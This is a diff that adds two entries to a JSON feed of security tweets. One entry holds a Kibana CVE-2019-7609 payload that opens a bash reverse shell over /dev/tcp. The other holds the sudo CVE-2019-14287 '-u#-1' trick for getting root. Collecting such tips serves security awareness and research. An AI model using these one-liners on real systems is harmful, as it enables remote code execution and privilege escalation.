@@ -39,6 +39,16 @@
     "username": "mohammadaskar2"
 }
 {
+    "tweetfavorites": 599,
+    "tweetquotes": 6,
+    "tweetreplies": 5,
+    "tweetretweets": 280,
+    "tweettext": "CVE-2019-7609  If you can't pop a shell via the last tweet ， you can change poc like 👇\n\n.es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -c \\'bash -i&gt;&amp; /dev/tcp/127.0.0.1/6666 0&gt;&amp;1\\'\");//')\n\n#BugBountyTips #BugBounty #bugbountytip https://t.co/XLGHJnxT0Y",
+    "tweettime": "2019-10-20, 10:09:32",
+    "tweeturl": "https://twitter.com/chybeta/status/1185860595620311042",
+    "username": "chybeta"
+}
+{
     "expanded_url": [
         "https://securityaffairs.co/wordpress/92633/hacking/cve-2019-2215-zero-day-exploit.html"
     ],
@@ -64,6 +74,19 @@
     "tweettime": "2019-10-17, 14:10:43",
     "tweeturl": "https://twitter.com/TheHackersNews/status/1184834125821145095",
     "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://seclists.org/oss-sec/2019/q4/18"
+    ],
+    "tweetfavorites": 97,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 32,
+    "tweettext": "CVE-2019-14287   sudo -u#-1 xxxx\n\nThis can be used by a user with sufficient sudo privileges to run\ncommands as root even if the Runas specification explicitly disallows\nroot access as long as the ALL keyword is listed first in\nthe Runas specification.\n\nhttps://t.co/zoTpcGEm4y https://t.co/TIZUjBjeTd",
+    "tweettime": "2019-10-15, 03:44:40",
+    "tweeturl": "https://twitter.com/chybeta/status/1183951800421871616",
+    "username": "chybeta"
 }
 {
     "tweetfavorites": 95,
